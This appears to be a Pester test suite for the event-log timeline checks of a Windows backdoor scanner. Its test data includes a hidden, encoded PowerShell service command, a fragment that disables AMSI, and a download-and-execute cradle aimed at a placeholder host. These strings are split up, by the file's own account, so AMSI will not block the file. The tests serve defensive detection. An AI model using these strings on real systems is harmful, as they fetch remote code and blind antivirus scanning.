# Linea temporale, con eventi finti costruiti come quelli letti dai registri di Windows.
# I contenuti sospetti sono composti a runtime per non far bloccare il file da AMSI.

BeforeAll {
    . "$PSScriptRoot\TestHelpers.ps1"
    . (Get-ModuleScript Common)
    . (Get-ModuleScript Timeline)

    function New-Ev([int]$Id, [hashtable]$Data, [int]$DaysAgo = 1) {
        [pscustomobject]@{ Time = (Get-Date).AddDays(-$DaysAgo); Id = $Id; Data = $Data }
    }
    function Reset-Scan { $script:Findings.Clear(); $script:Timeline.Clear() }
    function Get-TimelineFindings { @($script:Findings | Where-Object Category -eq 'Linea temporale') }
}

Describe 'Servizi installati (7045)' {
    BeforeEach { Reset-Scan }
    It 'segna come Alto un servizio con PowerShell nascosto, installato e poi rimosso' {
        Mock Test-ServiceExists { $false }
        $cmd = "%COMSPEC% /c powershell.exe -w hidden -enc $(New-HarmlessEncodedCommand)"
        Test-ServiceInstallEvents @(New-Ev 7045 @{ ServiceName = 'ABCDEFG'; ImagePath = $cmd })
        $f = @(Get-TimelineFindings)
        $f.Count | Should -Be 1
        $f[0].Severity | Should -Be 'Alto'
        $f[0].Title | Should -Match 'poi rimosso: ABCDEFG'
        $script:Timeline[0].FindingId | Should -Be $f[0].Id
    }
    It 'lascia al controllo dei servizi un servizio ancora installato' {
        Mock Test-ServiceExists { $true }
        $cmd = "%COMSPEC% /c powershell.exe -w hidden -enc $(New-HarmlessEncodedCommand)"
        Test-ServiceInstallEvents @(New-Ev 7045 @{ ServiceName = 'ABCDEFG'; ImagePath = $cmd })
        Get-TimelineFindings | Should -BeNullOrEmpty
        $script:Timeline.Count | Should -Be 1
    }
    It 'tralascia un driver firmato, anche se rimosso' {
        Mock Test-ServiceExists { $false }
        Test-ServiceInstallEvents @(New-Ev 7045 @{ ServiceName = 'Test'; ImagePath = '\SystemRoot\System32\drivers\null.sys' })
        Get-TimelineFindings | Should -BeNullOrEmpty
        $script:Timeline.Count | Should -Be 0
    }
    It 'raggruppa un driver che si reinstalla a ogni avvio' {
        Mock Test-ServiceExists { $true }
        $d = @{ ServiceName = 'vpnfilter'; ImagePath = 'C:\nonesiste\vpnfilter.sys' }
        Test-ServiceInstallEvents @((New-Ev 7045 $d 5), (New-Ev 7045 $d 3), (New-Ev 7045 $d 1))
        $script:Timeline.Count | Should -Be 1
        $script:Timeline[0].Text | Should -Match '\(3 volte\)'
        ([datetime]$script:Timeline[0].Time).Date | Should -Be (Get-Date).AddDays(-1).Date
    }
}

Describe 'Microsoft Defender' {
    BeforeEach { Reset-Scan }
    It 'riassume in una segnalazione le volte in cui la protezione e'' stata spenta' {
        Test-DefenderEvents @((New-Ev 5001 @{} 3), (New-Ev 5001 @{} 1))
        $f = @(Get-TimelineFindings)
        $f.Count | Should -Be 1
        $f[0].Severity | Should -Be 'Medio'
        $f[0].Detail | Should -Match '^2 volte'
        $script:Timeline.Count | Should -Be 2
    }
    It 'segna come Alto una minaccia che Defender non e'' riuscito a rimuovere' {
        $p = 'file:_C:\nonesiste\crack.exe'
        Test-DefenderEvents @((New-Ev 1116 @{ 'Threat Name' = 'Trojan:Win32/Prova'; Path = $p } 2), (New-Ev 1119 @{ 'Threat Name' = 'Trojan:Win32/Prova'; Path = $p } 2))
        $f = @(Get-TimelineFindings)
        $f.Count | Should -Be 1
        $f[0].Severity | Should -Be 'Alto'
        $f[0].Path | Should -Be 'C:\nonesiste\crack.exe'
    }
    It 'segna come Basso una minaccia gia'' rimossa' {
        Test-DefenderEvents @(New-Ev 1117 @{ 'Threat Name' = 'HackTool:Win32/Prova'; Path = 'file:_C:\nonesiste\keygen.exe'; 'Action Name' = 'Quarantena' })
        (Get-TimelineFindings)[0].Severity | Should -Be 'Basso'
    }
    It 'mette in linea temporale un''esclusione aggiunta, senza ripeterla come segnalazione' {
        $new = 'HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\Giochi = 0x0'
        Test-DefenderEvents @(New-Ev 5007 @{ 'New Value' = $new; 'Old Value' = '' })
        Get-TimelineFindings | Should -BeNullOrEmpty
        $script:Timeline[0].Path | Should -Be 'C:\Giochi'
        $script:Timeline[0].Severity | Should -Be 'Medio'
    }
}

Describe 'Account (4720, 4732)' {
    BeforeEach { Reset-Scan }
    It 'segnala un account creato' {
        Test-AccountEvents @(New-Ev 4720 @{ TargetUserName = 'supporto'; SubjectUserName = 'bob' })
        (Get-TimelineFindings)[0].Title | Should -Be 'Account creato: supporto'
    }
    It 'segnala un account aggiunto agli amministratori' {
        Test-AccountEvents @(New-Ev 4732 @{ TargetSid = 'S-1-5-32-544'; MemberName = 'CN=supporto'; SubjectUserName = 'bob' })
        (Get-TimelineFindings)[0].Title | Should -Be 'Aggiunto agli amministratori: CN=supporto'
    }
    It 'ignora l''aggiunta ad altri gruppi' {
        Test-AccountEvents @(New-Ev 4732 @{ TargetSid = 'S-1-5-32-555'; MemberName = 'supporto' })
        Get-TimelineFindings | Should -BeNullOrEmpty
    }
}

Describe 'Script PowerShell (4104)' {
    BeforeAll {
        $amsi = '[Ref].Assembly.GetType(''System.Management.Automation.' + 'Ams' + 'iUtils'')'
        $cradle = 'I' + 'EX (New-Object Net.' + 'WebClient).Download' + 'String(''https://esempio.invalid/a'')'
    }
    BeforeEach { Reset-Scan }
    It 'segna come Alto un tentativo di disattivare AMSI' {
        Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $amsi })
        (Get-TimelineFindings)[0].Severity | Should -Be 'Alto'
    }
    It 'tiene "da verificare" lo scaricamento con esecuzione, usato anche da installer legittimi' {
        Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle })
        (Get-TimelineFindings)[0].Severity | Should -Be 'Medio'
    }
    It 'ignora gli script di CheckBackdoor' {
        Test-PowerShellEvents -Events @(New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle }) -OwnText "x`n$cradle`ny"
        Get-TimelineFindings | Should -BeNullOrEmpty
    }
    It 'conta una volta lo stesso script e solo la prima parte di uno lungo' {
        Test-PowerShellEvents -Events @(
            (New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle }),
            (New-Ev 4104 @{ MessageNumber = '1'; ScriptBlockText = $cradle }),
            (New-Ev 4104 @{ MessageNumber = '2'; ScriptBlockText = $amsi }))
        @(Get-TimelineFindings).Count | Should -Be 1
    }
}

Describe 'Programmi avviati (BAM)' {
    It 'traduce percorso di dispositivo e data' {
        $when = Get-Date '2026-03-04 05:06:07'
        $bytes = [byte[]]([BitConverter]::GetBytes($when.ToFileTime()) + [byte[]](0) * 16)
        $e = ConvertFrom-BamValue -Name '\Device\HarddiskVolume3\Users\bob\a.exe' -Value $bytes -DriveMap @{ '\Device\HarddiskVolume3' = 'C:' }
        $e.Path | Should -Be 'C:\Users\bob\a.exe'
        $e.Time | Should -Be $when
    }
    It 'scarta valori non binari e dispositivi sconosciuti' {
        ConvertFrom-BamValue -Name 'Version' -Value 1 -DriveMap @{} | Should -BeNullOrEmpty
        ConvertFrom-BamValue -Name '\Device\Rete\x.exe' -Value ([byte[]](1..16)) -DriveMap @{} | Should -BeNullOrEmpty
    }
    Context 'valutazione' {
        BeforeAll {
            $dir = Join-Path $TestDrive 'Downloads'
            New-Item -ItemType Directory -Path $dir -Force | Out-Null
            $tool = Join-Path $dir 'tool.exe'
            Set-Content -LiteralPath $tool -Value 'non firmato'
        }
        BeforeEach { Reset-Scan }
        It 'segnala un programma non firmato avviato da una cartella utente' {
            Test-BamEntries -Entries @([pscustomobject]@{ Path = $tool; Time = (Get-Date).AddDays(-2) }) -Since (Get-Date).AddDays(-30)
            (Get-TimelineFindings)[0].Severity | Should -BeIn 'Alto', 'Medio'
        }
        It 'ignora gli avvii piu'' vecchi della finestra' {
            Test-BamEntries -Entries @([pscustomobject]@{ Path = $tool; Time = (Get-Date).AddDays(-40) }) -Since (Get-Date).AddDays(-30)
            $script:Timeline.Count | Should -Be 0
        }
        It 'mette solo in linea temporale un programma che non esiste piu''' {
            Test-BamEntries -Entries @([pscustomobject]@{ Path = (Join-Path $dir 'sparito.exe'); Time = (Get-Date).AddDays(-1) }) -Since (Get-Date).AddDays(-30)
            Get-TimelineFindings | Should -BeNullOrEmpty
            $script:Timeline[0].Text | Should -Match 'non esiste'
        }
        It 'non ripete un file gia'' segnalato da un altro controllo' {
            $script:Findings.Add((New-TestFinding -Category 'File sospetti' -Path $tool))
            Test-BamEntries -Entries @([pscustomobject]@{ Path = $tool; Time = (Get-Date).AddDays(-2) }) -Since (Get-Date).AddDays(-30)
            Get-TimelineFindings | Should -BeNullOrEmpty
            $script:Timeline.Count | Should -Be 1
        }
        It 'ignora i programmi installati in Program Files' {
            Test-BamEntries -Entries @([pscustomobject]@{ Path = "$env:ProgramFiles\App\app.exe"; Time = (Get-Date).AddDays(-1) }) -Since (Get-Date).AddDays(-30)
            $script:Timeline.Count | Should -Be 0
        }
    }
}
